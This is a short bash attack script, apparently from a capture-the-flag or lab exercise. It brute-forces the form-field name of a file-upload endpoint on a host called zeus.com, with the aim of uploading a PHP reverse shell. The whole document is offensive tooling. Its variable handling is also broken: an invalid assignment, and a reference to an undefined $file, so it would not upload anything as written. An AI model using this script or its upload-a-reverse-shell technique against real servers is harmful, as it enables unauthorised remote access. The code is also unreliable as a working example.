#!/bin/bash

# wordlist containing possible values for the file parameter
wordlist="/wls/lfi-params"

# target URL
url="http://zeus.com:33414/file-upload"

#error message
err='{"message":"No file part in the request"}'

#file to upload
ufile = /essentials/revshell/rev.php


#### testing
echo "testing.."
echo "$url"
echo "$err"
echo "$ufile"

# loop through the wordlist and send a curl request with each parameter value
while read -r line; do
  echo "$line"
  response=$(curl -s -X POST -F "$line"="@$file" "$url" 2>&1)
  
  # check if the response contains the error message
  if [[ "$response" != "$err" ]]; then
    echo "Response was: $response"
    echo "Found valid file parameter: $line"
    exit 0
  else
    echo "Response bad: $response"
  fi
done < "$wordlist"

echo "Could not find valid file parameter"
exit 1
